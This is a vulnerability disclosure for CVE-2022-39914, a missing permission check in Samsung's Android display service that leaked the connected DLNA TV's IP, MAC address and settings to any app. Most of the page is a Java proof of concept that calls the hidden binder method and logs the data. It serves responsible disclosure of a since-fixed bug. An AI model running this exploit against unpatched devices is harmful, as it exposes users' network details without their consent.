# Details

<table>
    <tr>
        <td>Name</td>
        <td>Samsung Android Framework</td>
    </tr>
    <tr>
        <td>Library path</td>
        <td><code>/system/framework/services.jar</code></td>
    </tr>
    <tr>
        <td>Reported date</td>
        <td>2022.08.16</td>
    </tr>
    <tr>
        <td>Fixed date</td>
        <td>2022.12.06</td>
    </tr>
    <tr>
        <td>Severity</td>
        <td>Moderate</td>
    </tr>
    <tr>
        <td>Handle</td>
        <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-39914">CVE-2022-39914</a> (SVE-2022-1950)</td>
    </tr>
    <tr>
        <td>Reward</td>
        <td>$810</td>
    </tr>
</table>

# Description

The system service `display` (`android.hardware.display.IDisplayManager`) was created in AOSP, but has been patched in the Samsung Android Framework. Samsung has also added support for DNLA Smart TVs. One of the methods to handle them `getDlnaDevice()` did not check any permissions and returned to any caller the currently connected DNLA screen. The data included the IP, MAC address, and other projector settings.

**Proof of Concept**

```java
static final int TRANSACTION_getDlnaDevice = 32;

protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);

    try {
        IBinder binder = getService("display");

        Parcel parcel = Parcel.obtain();
        parcel.writeInterfaceToken(binder.getInterfaceDescriptor());

        Parcel reply = Parcel.obtain();
        binder.transact(TRANSACTION_getDlnaDevice, parcel, reply, 0);
        reply.readException();

        if (reply.readBoolean()) {
            Parcelable.Creator creator = (Parcelable.Creator) Class.forName("android.hardware.display.SemDlnaDevice")
                    .getField("CREATOR").get(null);
            Log.d("evil", "Reply: " + creator.createFromParcel(reply));
        } else {
            Log.d("evil", "Reply: null");
        }
    } catch (Throwable th) {
        throw new RuntimeException(th);
    }
}

private IBinder getService(String name) throws Throwable {
    return (IBinder) Class.forName("android.os.ServiceManager")
            .getDeclaredMethod("getServiceOrThrow", String.class)
            .invoke(null, name);
}
```

## References

- [Oversecured Blog. Discovering vendor-specific vulnerabilities in Android](https://blog.oversecured.com/Discovering-vendor-specific-vulnerabilities-in-Android/)
